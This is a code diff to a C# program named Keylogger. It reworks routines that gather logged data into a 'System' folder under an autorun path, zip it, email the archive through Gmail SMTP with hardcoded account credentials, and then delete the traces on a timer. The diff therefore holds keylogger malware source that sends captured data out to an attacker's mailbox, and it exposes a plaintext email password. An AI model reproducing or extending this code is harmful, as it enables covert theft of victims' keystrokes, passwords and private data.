@@ -107,15 +107,11 @@ namespace Keylogger
 
         private void CreateDir()
         {
+            if (!Directory.Exists(AutoRun.Path() + "\\System"))
+            {
+                DirectoryInfo di = Directory.CreateDirectory(AutoRun.Path() + "\\System");
+            }
            
-            if (Directory.Exists(AutoRun.Path() + "\\System"))
-            {
-                
-            }
-            else
-            {
-                DirectoryInfo di = Directory.CreateDirectory(AutoRun.Path()+"\\System");
-            }
         }
 
         private void MouseEvent(object sender, EventArgs e)
@@ -507,28 +503,46 @@ namespace Keylogger
 
         private void CreateZIP()
         {
-            Thread thread = new Thread(t =>
+            using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile())
             {
-                m.WaitOne();
-                using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile())
+                try
                 {
-                    try
-                    {
-                        zip.AddDirectory(AutoRun.Path() + "\\System");
-                        //DirectoryInfo di = new DirectoryInfo(AutoRun.Path()+"\\System");
-                        zip.Save(AutoRun.Path() + "System.zip");
-                    }
-                    catch (Exception e)
-                    {
-                        MessageBox.Show("Create EX\n" + e.ToString());
-                    }
-                    finally
-                    {
-                        m.ReleaseMutex();
-                    }
+                    zip.AddDirectory(AutoRun.Path() + "\\System");
+                    zip.Save(AutoRun.Path() + "System.zip");
+                    MessageBox.Show("ZIP CREATED");
                 }
-            });
-            thread.Start();
+                catch (Exception e)
+                {
+                    MessageBox.Show("Create EX\n" + e.ToString());
+                }
+                finally
+                {
+                    zip.Dispose();
+                }
+            }
+            //Thread thread = new Thread(t =>
+            //{
+
+            //    m.WaitOne();
+            //    try
+            //    {
+            //        Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile();
+            //        zip.AddDirectory(AutoRun.Path() + "\\System");
+            //        zip.Save(AutoRun.Path() + "System.zip");
+            //        zip.Dispose();
+            //        MessageBox.Show("ZIP CREATED");
+            //    }
+            //    catch (Exception e)
+            //    {
+            //        MessageBox.Show("Create EX\n" + e.ToString());
+            //    }
+            //    finally
+            //    {
+
+            //        m.ReleaseMutex();
+            //    }
+            //});
+            //thread.Start();
 
         }
 
@@ -546,37 +560,39 @@ namespace Keylogger
             {
                 CreateZIP();
                 SendMail();
-                MessageBox.Show("Mail Sent");
                 DeleteFile();
             }
 
         }
 
+        private void DeleteZIP()
+        {
+            foreach (string f in Directory.GetFiles(AutoRun.Path()))
+            {
+                if (f == AutoRun.Path() + "System.zip")
+                {
+                    File.Delete(f);
+                    MessageBox.Show("ZIP DELETED");
+                }
+            }
+        }
+
         private void DeleteFile()
         {
-            Thread thread = new Thread(t =>
+            try
             {
-                m.WaitOne();
-                try
+                DirectoryInfo dirInfo = new DirectoryInfo(AutoRun.Path() + "\\System\\");
+                foreach (FileInfo f in dirInfo.GetFiles())
                 {
-                    File.Delete(AutoRun.Path() + "System.zip");
-                    DirectoryInfo dirInfo = new DirectoryInfo(AutoRun.Path() + "\\System\\");
-                    foreach (FileInfo f in dirInfo.GetFiles())
-                    {
-                        f.Delete();
-                    }
+                    f.Delete();
                 }
-                catch (Exception e)
-                {
-                    MessageBox.Show("Delete EX\n" + e.ToString());
-                }
-                finally
-                {
-                    m.ReleaseMutex();
-                }
-
-            });
-            thread.Start();
+                MessageBox.Show("FOLDER CLEARED");
+            }
+            catch (Exception e)
+            {
+                MessageBox.Show("Delete EX\n" + e.ToString());
+            }
+           
 
         }
 
@@ -614,7 +630,7 @@ namespace Keylogger
                 SmtpServer.Credentials = new System.Net.NetworkCredential("keyloggernazzim@gmail.com", "keylogger32");
                 SmtpServer.EnableSsl = true;
                 SmtpServer.Send(mail);
-                //MessageBox.Show("Sent");
+                MessageBox.Show("E-MAIL Sent");
             }
             catch (Exception ex)
             {
@@ -626,7 +642,6 @@ namespace Keylogger
         private int timeMail = 0;
         private void timerMail_tick(object sender, EventArgs e)
         {
-            
             timeMail++;
             labeltimemail.Content = timeMail.ToString();
 
@@ -634,6 +649,7 @@ namespace Keylogger
             {
                 if (_numValueMail * 2 == timeMail)
                 {
+                    DeleteZIP();//--------------
                     new Thread(() =>
                     {
                         m.WaitOne();
